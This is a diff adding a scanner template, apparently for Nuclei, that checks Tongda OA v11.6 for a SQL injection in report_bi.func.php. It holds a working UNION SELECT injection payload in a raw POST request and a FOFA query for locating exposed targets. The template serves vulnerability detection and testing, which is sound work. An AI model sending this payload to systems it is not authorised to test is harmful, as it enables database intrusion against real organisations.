@@ -1,0 +1,33 @@
+id: TongDa-7
+
+info:
+  name: 通达OA v11.6 report_bi.func.php SQL注入漏洞
+  author: attempt
+  severity: high
+  description: |
+    通达OA v11.6 report_bi.func.php 存在SQL注入漏洞，攻击者通过漏洞可以获取数据库信息
+  reference:
+    - https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E9%80%9A%E8%BE%BEOA-v11.6-report_bi.func.php-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="TDXK-通达OA"
+  tags: TongDa,OA,SQL注入漏洞
+request:
+  - raw:
+      - |
+        POST /general/bi_design/appcenter/report_bi.func.php HTTP/1.1
+        Host: {{RootURL}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Length: 113
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+        
+        _POST[dataset_id]=efgh%27-%40%60%27%60%29union+select+md5%281%29%2C2%2C3%23%27&action=get_link_info&
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "c4ca4238a0b923820dcc509a6f75849b"
